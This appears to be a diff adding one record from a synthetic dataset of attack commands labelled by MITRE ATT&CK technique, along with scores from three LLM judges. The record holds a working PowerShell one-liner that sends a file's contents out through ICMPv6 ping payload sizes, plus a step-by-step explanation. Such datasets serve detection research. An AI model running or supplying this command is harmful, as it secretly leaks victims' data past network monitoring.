@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::a%11'; $s=Get-Content -Path 'C:\\Users\\Public\\message.txt' -Raw; $s.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (700 + [byte][char]$_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Exfiltrates plaintext characters by mapping each char code into ICMPv6 payload size using Test-Connection, leveraging ICMPv6 as the exfil medium per T1011.",
+  "rationale_steps": [
+    "Read the text into memory.",
+    "For each character, convert to its byte value and offset it.",
+    "Send ICMPv6 echoes with payload sizes the receiver can decode."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-31058b99",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting and a valid pipeline, though the -IPv6 switch may not exist for Test-Connection in some versions.",
+        "semantic_score": 2,
+        "semantic_justification": "While encoding data via ICMPv6 payload size is plausible, this maps to exfiltration over an alternative protocol (e.g., ICMP) rather than T1011’s different network medium and also relies on a reachable link-local target and version-specific parameters.",
+        "combined_score": 3.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T01:06:48.366912Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, balanced quotes/parentheses, valid PowerShell cmdlets, and correct pipeline structure.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements T1011 by exfiltrating data over ICMPv6 (a different network medium than typical C2), encoding each character from the text file into the buffer size of ping packets sent to an IPv6 address.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:06:54.031267Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variable assignments, cmdlet invocations, parameter formatting (including an expression for BufferSize), piping, and control flow (ForEach-Object).",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the claimed intent by encoding individual characters into the ICMPv6 payload size using Test-Connection, effectively leveraging ICMPv6 as an 'other network medium' for exfiltration as described in T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T06:23:46.826623Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
